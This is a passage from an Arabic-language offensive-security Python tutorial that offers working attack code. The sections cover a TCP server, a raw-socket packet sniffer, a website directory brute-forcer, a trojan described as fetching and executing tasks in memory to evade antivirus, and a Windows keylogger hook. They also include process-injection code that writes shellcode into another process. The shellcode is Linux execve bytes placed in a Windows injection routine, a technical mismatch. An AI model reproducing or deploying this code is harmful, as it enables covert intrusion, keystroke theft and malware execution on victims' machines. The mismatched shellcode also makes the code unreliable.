2. برمجة أدوات الشبكات (Network Tools)

هنا يتم بناء أدوات للتعامل مع الـ Sockets والشبكات، بما في ذلك بناء TCP Client و Multi-threaded TCP Server للتحكم بالاتصالات الواردة.

أكواد بايثون كاملة للعميل والخادم:

كود خادم TCP متعدد المسارات (Multi-threaded TCP Server):

import socket
import threading

def handle_client(client_socket):
    with client_socket as sock:
        request = sock.recv(1024)
        print(f"[*] Received: {request.decode('utf-8')}")
        sock.send(b"ACK")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 9999))
server.listen(5)
print("[*] Listening on 0.0.0.0:9999")

while True:
    client, addr = server.accept()
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

3. بناء Sniffer وقراءة البيانات الخام (Raw Sockets)

كيفية كتابة سكريبت بايثون لقراءة وفك تشفير حزم الشبكة الخام (Raw Packets) على كارت الشبكة مباشرة دون الحاجة لأدوات خارجية مثل Wireshark.

كود الـ Sniffer للشبكات (بايثون 3):

import socket
import os

# Host to listen on
host = "192.168.1.100"

# Choose raw socket protocol based on OS
if os.name == "nt":
    socket_protocol = socket.IPPROTO_IP
else:
    socket_protocol = socket.IPPROTO_ICMP

sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
sniffer.bind((host, 0))

# Include IP headers in the captured packets
sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# If Windows, send IOCTL to enable promiscuous mode
if os.name == "nt":
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

# Read one packet
print(sniffer.recvfrom(65565))

# Disable promiscuous mode if Windows
if os.name == "nt":
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)

4. اختراق وتجاوز تطبيقات الويب بـ Python

بناء سكربتات لتخمين المسارات الحساسة للمواقع (Content Brute-forcing) وسحب الملفات والبيانات الحساسة بشكل تلقائي فائق السرعة.

كود تخمين المسارات السريع (Directory Finder):

import queue
import threading
import requests

threads = 10
target_url = "http://example.com"
wordlist_file = "all.txt"
resume_words = queue.Queue()

# Read wordlist
with open(wordlist_file, "r") as f:
    for word in f:
        resume_words.put(word.strip())

def dir_bruter(words):
    while not words.empty():
        attempt = words.get()
        url = f"{target_url}/{attempt}"
        try:
            r = requests.get(url)
            if r.status_code == 200:
                print(f"[200] Success: {url}")
        except Exception:
            pass

for i in range(threads):
    t = threading.Thread(target=dir_bruter, args=(resume_words,))
    t.start()

5. بناء حصان طروادة متكامل بـ Python (Building a Trojan)

كود كامل لبناء هيكل تروجان (Trojan Framework) يقوم بسحب المهام والملفات من مستودع خارجي (مثل GitHub) وتنفيذها محلياً على جهاز الضحية.

🛡️ أثر التروجان: استخدام مكتبات بايثون لتخطي الـ Antivirus عن طريق قراءة الأكواد المشفرة عن بعد عبر HTTPS وتنفيذها داخل الذاكرة دون تخزينها على الهارد ديسك (Fileless Execution).

6. برمجة Keylogger متطور للويندوز (Windows Keylogger)

برمجة سكريبت يقوم برصد ضغطات الأزرار على الكيبورد (Keystrokes) وتخزينها والتقاط لقطات شاشة (Screenshots) وإرسالها للسيرفر.

كود بايثون متطور لرصد الكيبورد (Windows Hooking):

import ctypes
import sys

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

def set_hook(hook_proc):
    return user32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        hook_proc,
        kernel32.GetModuleHandleW(None),
        0
    )

# A simple hook process wrapper
def hook_callback(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        key = ctypes.string_at(lParam, 4)
        print(f"[Key Detected]: {key}")
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

7. التلاعب بالذاكرة وحقن العمليات (Process Injection)

كيفية التلاعب بالعمليات النشطة على ويندوز (Windows Processes) وحقن Shellcode خبيث داخل مساحة ذاكرة عملية موثوقة (مثل Explorer.exe).

كود حقن العمليات (DLL/Process Injection):

import ctypes

# Windows APIs
kernel32 = ctypes.windll.kernel32
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Open remote process
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, 1234) # 1234 target PID

# Allocate memory in remote process
addr = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

# Write shellcode into allocated memory
written = ctypes.c_int(0)
kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))

# Execute shellcode inside remote process
thread_id = ctypes.c_ulong(0)
kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id))
